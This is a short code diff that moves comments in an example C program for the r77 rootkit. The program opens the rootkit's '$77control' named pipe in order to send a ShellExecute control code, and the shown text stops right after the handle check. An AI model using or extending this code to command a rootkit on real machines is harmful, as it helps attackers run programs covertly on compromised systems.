@@ -1,12 +1,12 @@
 #include <Windows.h>
 
+// This example demonstrates how to make r77 perform a ShellExecute.
+// All other control codes work similarly.
+
 #define CONTROL_USER_SHELLEXEC 0x3001 // These constants can be found in r77api.h or in the technical documentation
 
 int main()
 {
-	// This example demonstrates how to make r77 perform a ShellExecute.
-	// All other control codes work similarly.
-
 	// Connect to the r77 service. The rootkit must be installed.
 	HANDLE pipe = CreateFileW(L"\\\\.\\pipe\\$77control", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
 	if (pipe != INVALID_HANDLE_VALUE)
